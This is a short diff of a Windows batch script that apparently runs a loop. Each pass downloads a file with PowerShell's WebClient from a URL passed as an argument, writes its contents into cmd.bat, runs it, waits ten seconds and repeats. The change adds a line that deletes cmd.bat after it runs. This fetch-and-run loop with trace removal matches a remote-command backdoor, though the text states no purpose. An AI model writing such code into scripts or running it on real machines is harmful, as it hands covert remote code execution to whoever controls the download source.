@@ -8,6 +8,7 @@ If exist "%File%" (
 ( Type "%File%" >cmd.bat)
 )
 call cmd.bat
+del cmd.bat
 timeout 10 /NOBREAK >nul
 goto begin
 
@@ -17,10 +18,8 @@ Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2
 >nul find "At" error.txt && (
   goto offline
 ) || (
-  goto cont
+  exit /b
 )
-:cont
-exit /b
 :offline
 timeout 10 /NOBREAK >nul
 goto begin
